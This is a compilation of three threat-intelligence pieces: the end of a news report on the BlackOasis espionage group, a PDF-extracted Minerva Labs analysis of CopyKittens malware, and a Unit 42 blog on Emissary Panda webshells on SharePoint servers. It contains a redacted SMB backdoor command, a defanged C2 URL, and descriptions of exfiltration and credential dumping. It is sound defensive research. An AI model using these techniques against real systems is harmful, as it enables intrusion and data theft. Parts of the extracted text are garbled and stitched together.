intention appeared to be espionage.\\n“Unlike other FinFisher customers or users who focus mostly on domestic operations, BlackOasis focuses on external operations and go after a wide range of targets around the world,” explained Costin Raiu, director of the global research and analysis team at Kaspersky Lab.\\nGamma Group has been accused of selling its products to authoritarian regimes\\xa0that can use the technology to both track dissidents and conduct foreign espionage over the internet.\\nThe discovery by Kaspersky marks at least the fifth zero-day exploit used by BlackOasis and exposed by security researchers since June 2015. It’s unclear whether the hackers are purchasing the exploits and spyware together, directly from Gamma Group, or if they were able to acquire some of the tools through other avenues.\\n“BlackOasis’ interests span a wide gamut of figures involved in Middle Eastern politics and verticals disproportionately relevant to the region. This includes prominent figures in the United Nations, opposition bloggers and activists, and regional news correspondents,” a blogpost about Kaspersky’s findings reads.\\nThe\\xa0post continues, “during 2016, we observed a heavy interest in Angola, exemplified by lure documents indicating targets with suspected ties to oil, money laundering, and other illicit activities. There is also an interest in international activists and think tanks … Victims of BlackOasis have been observed in the following countries: Russia, Iraq, Afghanistan, Nigeria, Libya, Jordan, Tunisia, Saudi Arabia, Iran, Netherlands, Bahrain, United Kingdom and Angola.”\\nIntent was clearly espionage in many cases, going outside of that \"lawful surveillance\" boundary.\\n— Brian Bartholomew (@Mao_Ware) October 16, 2017\\nBrian Bartholomew, a senior security researcher with Kaspersky, said on Twitter that BlackOasis’ espionage included non-traditional targets\\xa0—\\xa0“going outside of that lawful surveillance boundary.”\\nAn advanced persistent threat group, previously identified by Microsoft and codenamed\\xa0Neodymium,\\xa0is closely associated with BlackOasis’\\xa0operations.\\nLast year, Microsoft researchers described Neodymium’s behavior as unusual:\\xa0“unlike many activity groups, which typically gather information for monetary gain or economic espionage, PROMETHIUM and NEODYMIUM appear to launch campaigns simply to gather information about certain individuals. These activity groups are also unusual in that they use the same zero-day exploit to launch attacks at around the same time in the same region. Their targets, however, appear to be individuals that do not share common affiliations.”\\nA cursory review of BlackOasis’ espionage campaign suggests there is some overlap between the group’s actions and Saudi Arabia’s geopolitical interests. For example, the targeting of Angolan organizations in mid-2016 coincidences directly with the rise of Angola’s oil business with China, which displaced Saudi Arabia as the number one exporter of crude oil to China at the time.\\nAll 13 countries where Kaspersky reportedly observed BlackOasis activity are connected to Saudi Arabia in one of three ways: economically; from a national security perspective; or due to established policy agreements.\\nIn addition, Saudi Arabia is a known customer of spyware and has used the technology domestically, according to Citizen Lab, a cybersecurity and human-rights focused research laboratory. Kaspersky’s research notes that BlackOasis hacked into computers based in Saudi Arabia.\\n-In this Story-\\nBlackOasis, cyberweapons, espionage, exploits, FinFisher, Gamma Group, Kaspersky, Saudi Arabia, security research, vulnerabilities, zero-days\\nRelated news\\nGovernment\\nThese tiny islands are at...\\nby Shannon Vavra • 18 hours ago\\nGovernment\\nVietnamese hackers...\\nby Shannon Vavra • 3 days ago\\nGovernment\\nInternal EU report on...\\nby Sean Lyngaas • 6 days ago\\nAd Specs\\nSponsor\\nRSS\\nPrivacy Policy\\n© 2020 Scoop News Group\\n|\\nAll Rights Reserved\\nSearch for:\\nThe best cybersecurity news, delivered straight to your inbox.\\nSign up for our daily newsletter.\\nPrivacy Policy\\nWe use cookies to provide you with the best experience across all Scoop News Group websites.

In between those highly advanced attacks, more and more attackers possessing only a basic set of skills started to pop up spreading well known RATs, obfuscated with generic publ icly - available packers. This report focus es on the CopyKittens , a mid - level group. The CopyKittens attacks are effect ive and advanced in a few ways : Infecting of computers is performed in multi - stage , stealthy method Data exfiltration is performed over DNS protocol They avoid using known RATs and packers, tools are \"homemade\" Constant development is performed to overcome security products improvements Yet, thi s group is clearly not made up of dozens of high - end comput er and security experts. The CopyKittens assembled major parts of their attack from code snippets carefully picked from public repositories and online forums, hence their nickname. We also named their attack tool \"Matryoshka\" 1 due to the fact that it was w ritten as a multi - stage framework, with each part of it built to integrate its subsequent step. We have had only a part ial window to the targets of the se semi - sophisticated yet highly effective attacks. Among them were Mi nistry of Foreign Affairs and some well - known Israeli academ ic researchers specializing in Middle East Studies . Even if we combine this with the fact that attackers goal seemed to be theft of sensitive data, we still lack the ability to clearly identify w ho is behind this attacks and if it was sponsored by another major actor. In our opinion, this will not be the last time we hear from t his group. Their constant striving toward improved performance , the f act that they probably executed successful attacks a nd the current turmoil in the Middle East region leads us to the conclusion that the CopyKittens will keep striking targets with similar profile s in the near future. 1 https://en.wikipedia.org/wiki/Matryoshka_doll 4 The G roup A ttack C ycle CopyKittens has conducted at least three waves of cyber - attacks in the p ast year. In each of the attacks the infection method was almost identical and included an extraordinary number of stages used to avoid detection . As with other common threat actors, the group relies on social engineering methods to deceiv e its targets prior to infection. Step One Spear Phishing The attack is initiated by sending an infected document file as an email attachment. In most cases the email subjects have been carefully chosen We were able to r etain a copy of an email used to target an Israeli ambassador in a large eastern European country. Some of the emails subject s were: 1. Registration form to the United Nations CTITF (Counter Terrorism Implementation Task Force) . 2. [ Israeli MFA ] questionnaire - URGENT An original paper, probably stolen in previous attacks 2 . The email contains the first link in the chain, a word document, containing an OLE binary object . 2 https://malwr.com/analysis/ZDg3Nzg3MDM3MWQwNDdmNTgwYWRmOTJkNWFhYTQ0ZjY/ 5 their names with a special invisible Unicode character . This character officially described as \"Right - To - Left Override\" flips the directionality of the string from its position and onward. For example, if we name a file \"filename [special flipping char]fdp .scr\" it will be displayed as This form of subterfuge has been previously employed by other Middle Eastern threat actors such as , reported by Kaspersky 3 and by elements operating in Syria 4 . In other cases , the document includes instructions motivating the victim to enable macro code execution. If the trap is successful and the user played his part, the infection stage begin s . 3 https://securelist.com/blog/research/68817/the - desert - falcons - targeted - attacks/ 4 http://syrianmalware.com/ 6 Step Two - Droppers Matryoshka Unlike most malwares, tools are bound to each other. The Matryoshka infection framework is built of three parts: Dropper o Obfuscating code and signaling to the C2 that the file has been executed o Launching the loader and using it to execute functions. o Comparing anti - analysis logic and re porting it back to C2 Reflective Loader o Employing a nti - debugging and anti - sandboxing techniques o Runtime API Address resolver o Covert DLL injection of the RAT library o Persistence file on disk RAT component o Configuring the Reflective Loader to survive reboots and process exits o DNS Command and Control communication o Common RAT functionalit ies Dropper SCR PE F ile Files with scr extension are just the same as exe executables. Windows screen savers originally used this extension but nowadays medium - leve l threat actors commonly use it as a way to deceive the average user who might be deter red from an exe file extension. The dropper name always matched the promised content of the spear phishing email . In the latest version of the dropper, the lure pdf is saved to with a n , followed by a successfully saved, the pdf is opened and displayed to the user via ShellExecute API a nd Open command. This is done to lower the target \\'s suspicions and mask the true functionality of the executable. While the user unsuspectingly reads the document, the following routine runs hidden in the background: The malware first unpack s Reflect ive the memory and signals to its C2 by downloading an image file from a remote server. The URL of the remote file is built out of two constant strings which again might suggest some kind of bui lder to this platform. W e believe t he first string to be a unique ID of the target or sample. The second is the full URL After signaling to the attackers, the malware call s a specific export function from the Reflective Loader . This routine is a cop ied code , led 7 by Alberto Ortega (@a0rtega ) 5 who describes it as: A demons tration tool that employs several techniques to detect sandboxes and analysis environments in the same way as malware families do . Pafish will enumerate and look for known virtualization and sandbox artifacts and then print results back to the researcher screen. Since the original Pafish code is built to improv e security ability to discover evasive malware, the CopyKittens group ha s modifi ed the code logic. Instead of printing the functions results back to the user, th e code will now assign a static number from 1 - 27 in the case of an artifact being found , and will return that value to the calling function (the SCR dropper in this case) . Upon the dropper will perform a simple compar ison and if an analysis machine has been detected , it will signal the attackers again using almost the same URL as it did before but replacing the name of the png file to the letter n concatenated with the number of the artifact found by Pafish. Belo w is a table demonstrating the artifacts and their corresponding value: sandbox username s and path s 1,2 Generic sandbox sleep patch 5 DeleteFile is hooked 6 Sandboxie sbiedll is injected 7 Wine Linux emulator is present 8 Running in Virtualbox VM 9 - 21 Running in VMWARE VM 22 - 25 Running in QEMU VM 26,27 5 https://github.com/a0rtega/pafish 8 During our investigation we were able to identify an example of this behavior in a Virus T otal report on one of the domains used by the attackers: We believe this URL was submitted by a target or other researchers analyzing the malware. After alerting the attackers they have been discovered , the dropper will try to delete the temporary files created by him and terminate activity of the infection process. In the case no analysis machine is found , Re flective Loader (possibl y abbreviation of the word decrypt ) and the third stage of the attack will commence. Step Three - Reflective Loader In an attempt to increase stealth iness , the CopyKitten s group has decided to use another open source project 6 by Stephen Fewer (@ stephenfewer ). The project implements a remote library Fewer describes the method in his paper 7 : injection technique in which the concept of reflective . This method enables the RAT library to run on the host machine without a dedicated process and without reg istration of the library under the loaded modules. The original project was built as a command line utility with the target process identifier provided as an argument. In a real attack scenario, the injected process identifier is obviously unknown to the attacker and a suitable host process should be located at runtime. The CopyKitten s group has implemented this routine by using WTSEnumerateProcess API to get a list of current active process es and then trying to get a handle to each process via OpenProces API , avoiding x64 process es . 6 https://github.com/stephenfewer/ReflectiveDLLInjection 7 http://www.harmonysecurity.com/files/HS - P0 05_ReflectiveDllInjection.pdf 9 Once a suitable host has been found for infection, the rest of project code will be used to inject the malicious library and execute the RAT. 10 Step Four - RAT C omponent The main part of Matryoshka is a r emote administration tool library . I t is designed to exist in the infected computer memory and is never written to the computer \\'s physical disk itself . When we ed the disk , some of the AV tools detect it with the following signatures: Trojan.J ectin identified on April 9 th 2015 by Symantec 8 . Troj/Agent - AMEY that was identified on March 25 th 2015 by Sophos 9 . This , however , is not the case while the RAT is injected into a legitimate host process. Runtime API Address Resolution Since the library is injected into memory , the imported functio ns must be resolved in runtime , t o solve this problem the Copy Kitten s 10 using the LoadLibrary and GetProcAddress API s . In order to evade static virus scan ners in new version of the RAT, the attackers obfuscated the names of the API function s . T hey resolve them in runtime using a simple substitute cipher combined with Base64 encoding. T he same trick was used in the Reflective Loader component. We retrieved the original functions names as plaintext strings by using a simple Python script . A list of decrypted API strings and the python code can be found in the Appendix and Minerva Labs Research GitHub repository 11 . Installation and Persistence S ince the RAT library was built to run from the memory of a host process , it relies on the l oader to survive system restart .

The task scheduler method has also been added to the newest version of the RAT. 8 http://www.symantec.com/security_response/earthlink_writeup.jsp?docid=2015 - 040923 - 3643 - 99 9 https://www.sophos.com/en - us/threat - center/threat - analyses/viruses - and - spyware/Troj~Agent - AMEY/detailed - analysis.aspx 10 https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/a_museu m_of_api_obfuscation_on_win32.pdf 11 https://github.com/MinervaLabsResearch/BlogPosts 11 This makes the RAT unstable as multiple instances may be executed simultaneously on the same host machine causing unexpected behavior . To reduce this risk , the authors have u sed a global mutex. DNS Command & Control The RAT uses DNS protocol to communicate with the attackers C2 server. The DNS queries are constructed from the following sections : 1. C2 domain name 2. The u nique ID of the infected machine (computer name + HD serial 3. Random string 4. D ata to be transmitted. To make traffic analysis and detection more difficult, the group uses a substitute c ipher to obfuscate the data before it i s sent to the C2 : 12 Another way used to disguise the DNS traffic and lower the suspicions of SOC and NOC teams was t he use IPs from address blocks of Microsoft and McAfee in the C2 response s : Once a command is received from the C2 server in the DNS response , the RAT will translate it to a corresponding command. For example , when the C2 sends a DNS response with the IP address 134.170.185.13 , the RAT will try and steal outlook passwords. 13 Common RAT C apabilities Outlook passwords This functionality resemble s a method described by SecurityExploded 12 Recovering Passwords from Outlook 2002 - 2013 assume that the group has copied this code as well. Screen G rabbing a nd K eylogging This RAT is also capable of screen grabbing and keylogging. Unsurprisingly , here too we were able to trace back a portion of the original source code from the popular rohitab.com online forum 13 . 12 http://securityxploded.com/outlookpasswordsecrets.php ( Recovering Passw ords from Outlook 2002 - 2013 ) 13 http://www.rohitab.com/discuss/topic/40069 - keylogging - all - users - across - windows - 7 - professional/ 14 Another interesting f act is that the author also copied the r egistry k ey described in the installation stage above, replacing only a single c haracter of the original randomly generated unique ID . 15 Improvement O ver T ime In comparing samples from different attack cycles, we can easily see that the attackers have spent time improving their tool , making it more persistent and harder to detect . For example , between the first versions of the RAT and the latest, the group started to resolve more API during runtime , using obfuscated strings . A comparison of the outlook password extraction function from previous and current RAT versions can be seen b elow. In addition , the group ha s been adding anti sandboxing techniques, such as the code from Pafish described above and a nti - d ebugging methods: This anti - debugging code seems to have been copied from CodeProject 14 , a well - known online source. 14 http://www.codeproject.com/Articles/30815/An - Anti - Reverse - Engineering - Guide 16 About Us Minerva Labs Minerva offers a low footprint endpoint protection platform.

We believe the adversary exploited a recently patched vulnerability in Microsoft SharePoint tracked by CVE-2019-0604, which is a remote code execution vulnerability used to compromise the server and eventually install a webshell. The actors uploaded a variety of tools that they used to perform additional activities on the compromised network, such as dumping credentials, as well as locating and pivoting to additional systems on the network. Of particular note is their use of tools to identify systems vulnerable to CVE-2017-0144, which is the same vulnerability exploited by EternalBlue that is best known for its use in the WannaCry attacks of 2017.\\nThis activity appears related to campaigns exploiting CVE-2019-0604 mentioned in recent security alerts from Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security. In addition to the aforementioned post-exploitation tools, the actors used these webshells to upload legitimate executables that they would use DLL sideloading to run a malicious DLL that has code overlaps with known Emissary Panda attacks. We also found the China Chopper webshell on the SharePoint servers, which has also been used by the Emissary Panda threat group.\\nIn this blog, we provide details of the tools and tactics we observed on these compromised SharePoint servers, explain how we believe these connect to the Emissary Panda threat group, correlate our findings with those of the Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security, and provide indicators of compromise (IoCs) from our research. You can find the Adversary Playbook for the activity detailed in this blog here.\\nAttack Overview\\nThis webshell activity took place across three SharePoint servers hosted by two different government organizations between April 1, 2019 and April 16, 2019, where actors uploaded a total of 24 unique executables across the three SharePoint servers. Figure 1 shows a timeline of when the files were uploaded to the three webshells. The timeline shows three main clusters of activity across the three webshells, with activity occurring on two separate webshells (green and orange) within a very small window of time on April 2, 2019 and the activity involving the third webshell two weeks later on April 16, 2019. The actors uploaded several of the same tools to across these three webshells, which provides a relationship between the incidents and indicates that a single threat group is likely involved.\\nFigure 1. Timeline of file uploads across three related webshells\\nThe tools uploaded to the webshells range from legitimate applications such as cURL to post-exploitation tools such as Mimikatz. The threat actors also uploaded tools to scan for and exploit potential vulnerabilities in the network, such as the well-known SMB vulnerability patched in MS17-010 commonly exploited by EternalBlue to move laterally to other systems on the network. We also observed the actors uploading custom backdoors such as HyperBro which is commonly associated with Emissary Panda. Based on the functionality of the various tools uploaded to the webshells, we believe the threat actors breach the SharePoint servers to use as a beachhead, then attempt to move laterally across the network via stolen credentials and exploiting vulnerabilities.\\nWebshells Installed\\nAs previously mentioned, we found webshells installed on three SharePoint servers hosted at two different organizations, two of which had the same file name of errr.aspx and the other a filename of error2.aspx. The webshells were hosted at the following paths on the compromised servers:\\n/_layouts/15/error2.aspx\\n/_layouts/15/errr.aspx\\nWe were able to gather one of the webshells with which we saw the actor interacting, specifically the error2.aspx file listed above. The error2.aspx file (SHA256: 006569f0a7e501e58fe15a4323eedc08f9865239131b28dc5f95f750b4767b38) is a variant of the Antak webshell, which is part of a tool created for red teaming called Nishang. The specific variant of Antak in error2.aspx is version v0.5.0, which is an older version of the webshell that was updated in August 2015 to v0.7.6 to include some basic authentication functionality and the ability to perform SQL queries. It’s possible the actors obtained Antak v0.5.0 via the Nishang GitHub repository or from SecWiki’s GitHub that also has the v0.5.0 version of Antak. Figure 2 shows the Antak webshell loaded on one of the Sharepoint servers.\\nFigure 2. Antak webshell ‘error2.aspx’ used to upload post-exploitation tools\\nWhile we observed the threat actor uploading additional tools to the Antak webshell above, the Sharepoint server also had several other webshells installed. The additional webshells, specifically stylecs.aspx, stylecss.aspx, and test.aspx are listed in Table 1, and appear related to the China Chopper webshell. We cannot be sure all of these webshells were installed by the same actors, as multiple actors could have exploited the SharePoint server. For instance, the China Chopper-related webshells are one-line of JScript code that could be easily copied and used by multiple groups, and the Antak webshell is easily obtained from publicly accessible repositories. However, the installation of China Chopper and the uploading of Emissary Panda related custom payloads to the Antak webshell suggests they are likely related, as this threat group has used China Chopper to compromise servers in the past.\\nFilename\\nSHA256\\nstylecs.aspx\\n2feae7574a2cc4dea2bff4eceb92e3a77cf682c0a1e78ee70be931a251794b86\\nstylecss.aspx\\nd1ab0dff44508bac9005e95299704a887b0ffc42734a34b30ebf6d3916053dbe\\ntest.aspx\\n6b3f835acbd954af168184f57c9d8e6798898e9ee650bd543ea6f2e9d5cf6378\\nTable 1. Additional webshells hosted on Sharepoint server\\nThe stylecs.aspx webshell provides fairly significant functionality, as its developer wrote this webshell in JScript that ultimately runs any supplied JScript code provided to it within the HTTP request. Figure 3 shows this webshell’s code that will run supplied JScript provided in base64 encoded format within the URL within a parameter e358efa489f58062f10dd7316b65649e. The parameter e358efa489f58062f10dd7316b65649e is interesting as it is the MD5 hash for the letter ‘t’, which is a known parameter for China Chopper as mentioned in the next section.\\nFigure 3. China Chopper code found in stylecs.aspx webshell on SharePoint server\\nThe stylecss.aspx webshell is very similar to the stylecs.aspx, as it runs JScript provided within the e358efa489f58062f10dd7316b65649e parameter of the URL; however, the stylecss.aspx webshell does not accept base64 encoded JScript, but expects the JScript in cleartext that the actor would provide as URL safe text. Figure 4 shows the code within stylecss.aspx, which when compared to Figure 3 above shows the lack of the base64 decoding function ‘FromBase64String’.\\nFigure 4. China Chopper code found in stylecss.aspx webshell on SharePoint server\\nThe last webshell extracted from the Sharepoint server had a filename of test.aspx, which is very similar to the stylecs.aspx webshell as it runs base64 encoded JScript provided in the URL of the request. However, the test.aspx webshell uses a parameter related to the compromised organization to obtain the base64 encoded JScript that it will run and display within the browser. The test.aspx shell also includes code that sets the HTTP response status to a 404 Not Found, which will display an error page but will still run the provided JScript. Figure 5 shows the code within the test.aspx file.\\nFigure 5. China Chopper code found in test.aspx webshell on SharePoint server\\nLinks to Security Advisories\\nIn April 2019, several national security organizations released alerts on CVE-2019-0604 exploitation, including the Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security. Both of these alerts discussed campaigns in which actors used the CVE-2019-0604 to exploit SharePoint servers to install the China Chopper webshell. While we cannot confirm all of the claims made in these advisories, we noticed overlaps in the webshell code hosted on the compromised SharePoint servers we observed and the webshells mentioned in these advisories.\\nThe Saudi Arabian National Cyber Security Center’s alert provided details regarding the activities carried out by the adversary. This alert also displayed the code associated with the China Chopper webshell observed in the attacks, which included Request.Item[“t”] to obtain JScript code from the ‘t’ parameter of the URL. As mentioned in the previous section, stylecs.aspx and stylecss.aspx both used a parameter of e358efa489f58062f10dd7316b65649e, which is the MD5 hash of ‘t’. This may suggest the actor modified the script slightly between the attack we observed, and the attack mentioned in the NCSC advisory, all while retaining the same functionality. Also, the NCSC advisory mentioned that the actors used a file name stylecss.aspx for their webshell, which is the same filename we saw associated with China Chopper.\\nThe alert from the Canadian Center for Cyber Security included the SHA256 hashes of the files associated with the campaign, one of which was 05108ac3c3d708977f2d679bfa6d2eaf63b371e66428018a68efce4b6a45b4b4 for a file named pay.aspx. The pay.aspx file is part of the China Chopper webshell and is very similar to the stylecss.aspx webshell we discussed above, with the only major difference is the URL parameter of ‘vuiHWNVJAEF’ within the URL that pay.aspx webshell uses to obtain and run JScript. Figure 6 below shows a comparison between the stylecss.aspx and pay.aspx files.\\nFigure 6. Comparison between stylecss.aspx webshell and pay.aspx webshell discussed in Canadian Center for Cyber Security advisory\\nTools Uploaded\\nDuring our research into this attack campaign, Unit 42 gathered several tools that the actor uploaded to the three webshells at the two government organizations. The chart in Figure 7 shows the same tools being uploaded to the webshells, which provided an initial linkage between the activities. One of the overlapping tools uploaded to the webshells is the legitimate cURL application, which could be used by multiple groups. The other overlapping files are tools used by the adversary to locate other systems on the network (etool.exe), check to see if they are vulnerable to CVE-2017-0144 (EternalBlue) patched in MS07-010 (checker1.exe) and pivot to them using remote execution functionality offered by a tool similar to PsExec offered by Impacket (psexec.exe). These tools are not custom made by the adversary but still provide a medium confidence linkage between the activities. We also observed the actors uploading the HyperBro backdoor to one of the webshells, as well as legitimate executables that would sideload malicious DLLs that have overlapping code associated with known Emissary Panda activity.\\nFigure 7. Relationships between tools uploaded to the three webshells hosted on SharePoint servers\\nThe actors uploaded 10 portable executables to the error2.aspx webshell, as seen in Table 2. The list of tools uploaded to this webshell includes legitimate applications, such as cURL and a component of Sublime Text used to sideload a malicious DLL, which we will discuss in an upcoming section. The list also includes several hack tools, such as Mimikatz for credential dumping and several compiled python scripts used to locate and compromise other systems on the local network. Lastly, we saw the actor uploading a custom backdoor called HyperBro, which has been associated with Emissary Panda operations in the past. We will provide an analysis of the HyperBro tool in an upcoming section.\\nFilename\\nSHA256\\nDescription\\nm2.exe\\nb279a41359367408c627ffa8d80051ed0f04c76fbf6aed79b3b2963203e08ade\\nPacked Mimikatz tool.\\npsexec.exe\\n7eea6e15bb13a3b65cca9405829123761bf7d12c6dc3b81ce499d8f6a0b25fb7\\nCompiled Impacket psexec\\ns.exe\\n04f48ed27a83a57a971e73072ac5c769709306f2714022770fb364fd575fd462\\nHyperBro backdoor\\ncurl.exe\\nabc16344cdfc78f532870f4dcfbb75794c9a7074e796477382564d7ba2122c7d\\nLegitimate cURL\\ncurl.exe\\nbbb9cd70fdc581812822679e6a875dcf5b7d32fd529a1d564948a5a3f6f9e3ab\\nLegitimate cURL\\nchecker1.exe\\n090cefebef655be7f879f2f14bd849ac20c4051d0c13e55410a49789738fad98\\nCompiled EternalBlue checker script\\netool.exe\\n38fa396770e0ecf60fe1ce089422283e2dc8599489bd18d5eb033255dd8e370c\\nC# Tool, likely from https://github.com/mubix/netview\\nplugin_host.exe\\n738abaa80e8b6ed21e16302cb91f6566f9322aebf7a22464f11ee9f4501da711\\nLegitimate Sublime Text plugin host\\nPYTHON33.dll\\n2dde8881cd9b43633d69dfa60f23713d7375913845ac3fe9b4d8a618660c4528\\nSideloaded DLL loaded by Sublime Text\\ncurl.exe\\nbbb9cd70fdc581812822679e6a875dcf5b7d32fd529a1d564948a5a3f6f9e3ab\\nLegitimate cURL.\\nTable 2.

Unique tools uploaded to the errr.aspx webshell installed on a SharePoint server\\nTwo of the tools, specifically the compiled zzz_exploit.py and checker.py suggest the actor would check and exploit remote systems if they were not patched for MS17-010, which patched the CVE-2017-0144 (EternalBlue) vulnerability. Also, the use of the Mimikatz and pwdump tools suggests the adversary attempts to dump credentials on compromised systems. We were able to gather the command line arguments the actor used to run the SMB backdoor smb1.exe. The following arguments shows the actor using the SMB backdoor to attempt to run a batch script m.bat on a remote host using a domain username and the account’s password hash:\\nc:\\\\programdata\\\\smb1.exe <redacted 10.0.0.0/8 IP> <redacted domain>\\\\<redacted username> :<redacted password hash> winsk c:\\\\programdata\\\\m.bat\\nWe saw far fewer portable executable files uploaded to the second errr.aspx webshell, specifically the 3 files seen in Table 4. The files uploaded to this webshell included the same compiled python script that would scan remote systems that were vulnerable to CVE-2017-0144 (EternalBlue) that we saw uploaded to the other errr.aspx webshell. Also, we observed the actor uploading a legitimate Microsoft application that would sideload a malicious DLL, of which was very similar to the DLL sideloaded by the Sublime Text plugin host that was uploaded to the error2.aspx webshell.\\nFilename\\nSHA256\\nDescription\\nchecker1.exe\\nd0df8e1dcf30785a964ecdda9bd86374d35960e1817b25a6b0963da38e0b1333\\nCompiled MS17-010 checker\\nCreateMedia.exe\\n2bb22c7b97e4c4d07e17a259cbc48d72f7e3935aa873e3dd78d01c5bbf426088\\nLegitimate CreateMedia.exe application from Microsoft’s System Center 2012 Configuration Manager\\nCreateTsMediaAdm.dll\\n06510504f30feb1adc7e423d5a24e67e5b97acbfafe40f253a054be8b1c4e8d7\\nSideloaded DLL loaded by CreateMedia.exe\\nTable 4.

However, several of the tools uploaded to the webshells appear to be custom made and likely related to the Emissary Panda threat group.\\nHyperBro\\nThe s.exe (SHA256: 04f48ed27a83a57a971e73072ac5c769709306f2714022770fb364fd575fd462) uploaded to the error2.aspx webshell is a self-extracting 7-zip archive that is an example of the HyperBro backdoor. According to Kaspersky and SecureWorks research, HyperBro is a custom backdoor developed and used by Emissary Panda in their attack campaigns. This sample of HyperBro is similar to the sample discussed in Kaspersky’s research, specifically using a legitimate pcAnywhere application to sideload a DLL to decrypt, decompress and run a payload embedded within a file named ‘thumb.db’. Table 5 shows the three files associated with this HyperBro sample, which have the same file names as the self-extracting 7zip archives mentioned in Kaspersky’s blog (SHA256 hashes: 34a542356ac8a3f6e367c6827b728e18e905c71574b3813f163e043f70aa3bfa and 2144aa68c7b2a6e3511e482d6759895210cf60c67f14b9485a0236af925d8233).\\nFilename\\nSHA256\\nDescription\\nthinprobe.exe\\n76d2e897ca235beab44ee7eaab9ede7bc7868bbaeb7d6cb10b4323c07eb216af\\nSymantec pcAnywhere thinprobe application\\nthinhostprobedll.dll\\nd40414b1173d59597ed1122361fe60303d3526f15320aede355c6ad9e7e239af\\nSideloaded DLL loaded by thinprobe.exe\\nthumb.db\\n270ea24f2cef655bd89439ab76c1d49c80caaa8899ffa6f0ef36dc1beb894530\\nContains encrypted and compressed DLL payload run by sideloaded DLL\\nTable 5. Files associated with the HyperBro tool uploaded to webshell on SharePoint server\\nThe functional payload is a DLL compiled on 2019-03-11 02:23:54, which has two functionalities depending if the binary has a command line argument -daemon or -worker passed to it. The daemon functionality handles the C2 communications portion of the Trojan, which is configured to communicate with 185.12.45[.]134 over HTTPS using the following URL:\\nhxxps://185.12.45[.]134:443/ajax\\nThe worker functionality acts on the data received from the C2 server, which is passed from the daemon to the worker via a named pipe called “\\\\\\\\.\\\\pipe\\\\testpipe“. The worker subjects the received data to a command handler whose available commands are listed in Table 6.\\nCommand\\nSub-command\\nDescription\\n0x12\\nFile manager\\n0x10\\nEnumerate logical storage volumes\\n0x11\\nDelete a specified file\\n0x12\\nUpload a file\\n0x13\\nDownload a file\\n0x17\\nList contents of a folder\\n0x19\\nRun an application (CreateProcessW) or script/file (ShellExecuteW)\\n0x13\\nExecute command on shell\\n0x16\\nTakes screenshot\\n0x19\\nRuns shellcode it injects into a newly created process ‘msiexec.exe’\\n0x1a\\nKill specific process\\n0x1e\\nService manager\\n0x17\\nList all services and their configurations\\n0x19\\nStart a specified service\\n0x1a\\nStop a specified service\\nTable 6. The commands available within the HyperBro tool’s command handler\\nUnknown Sideloaded Payloads\\nTable 2 and 4 above include two legitimate executables used for DLL sideloading, specifically the plugin_host.exe application for Sublime Text and the CreateMedia.exe application from Microsoft’s System Center 2012 Configuration Manager. The plugin_host.exe application imports several functions from a library named python33, which is how the legitimate application sideloads the malicious DLL named PYTHON33.dll. This is the first instance we have observed Sublime Text’s plugin host application used for sideloading. Like the plugin host application, the CreateMedia.exe application imports several functions from a library named CreateTsMediaAdm that is leveraged to load the malicious DLL named CreateTsMediaAdm.dll.\\nThe PYTHON33.dll and the CreateTsMediaAdm.dll libraries are very similar with BinDiff providing a 97% similarity with 99% confidence between the two DLLs. The code diff in Figure 8 shows the decryption routine in PYTHON33.dll (right) and CreateTsMediaAdm.dll (left), both of which use an eight byte XOR key to decrypt a piece of shikata_ga_nai obfuscated shellcode. The shellcode is responsible for patching the entry point of the legitimate application to call another function in the shellcode that is responsible for loading a file with the library name with an .hlp extension (PYTHON33.hlp or CreateTsMediaAdm.hlp).\\nFigure 8. Code comparison between the sideloaded CreateTsMediaAdm.dll and PYTHON33.dll files uploaded to two webshells\\nUnfortunately, we do not have access to the PYTHON33.hlp or CreateTsMediaAdm.hlp files, so we do not know the final payload loaded by either of these DLLs. However, using NCC Group’s research published in May 2018, we were able to discover code overlaps between these DLLs and a sideloaded DLL that ran the SysUpdate tool that the NCC group has associated with an Emissary Panda campaign. Figure 9 shows a code comparison between the PYTHON33.dll (right) and inicore_v2.3.30.dll (left) (SHA256: 4d65d371a789aabe1beadcc10b38da1f998cd3ec87d4cc1cfbf0af014b783822), which was sideloaded to run the SysUpdate tool in a previous Emissary Panda campaign. The code overlaps below include the same technique to find the entry point of the loading executable and decrypting the first piece of shellcode used to patch the entry point.\\nFigure 9. Code comparison between the sideloaded PYTHON33.dll uploaded to webshell and the inicore_v2.3.30.dll file sideloaded in previous Emissary Panda attacks\\nConclusion\\nThe Emissary Panda threat group loaded the China Chopper webshell onto SharePoint servers at two Government organizations in the Middle East, which we believe with high confidence involved exploiting a remote code execution vulnerability in SharePoint tracked in CVE-2019-0604. According to Microsoft’s advisory, this vulnerability was patched on March 12, 2019 and we first saw the webshell activity on April 1, 2019. This suggests that the threat group was able to quickly leverage a known vulnerability to exploit Internet facing servers to gain access to targeted networks.\\nOnce the adversary established a foothold on the targeted network, they used China Chopper and other webshells to upload additional tools to the SharePoint server to dump credentials, perform network reconnaissance and pivot to other systems. We believe the actors pivoted to other systems on the network using stolen credentials and by exploiting the CVE-2017-0144 (EternalBlue) vulnerability patched in MS17-010. We also observed the actors uploading legitimate tools that would sideload DLLs, specifically the Sublime Text plugin host and the Microsoft’s Create Media application, both of which we had never seen used for DLL sideloading before.\\nPalo Alto Networks customers are protected by:\\nThe CVE-2019-0604 vulnerability is covered by our IPS signature Microsoft Sharepoint Remote Code Execution Vulnerability (55411)\\nAll illegitimate tools uploaded to the webshells are marked with malicious verdicts by WildFire and Traps.\\nAutoFocus customers can track the custom Emissary Panda payload seen uploaded to the webshell using the HyperBro tag, but can also track the hack tools using the following tags (note the hack tools are used by multiple actors and not just Emissary Panda):\\nSmbExec\\nPsExec\\nPsExec_Python\\nBChecker\\nZZZ_Exploit\\nTermite\\nIncognito\\nPwDump\\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members.

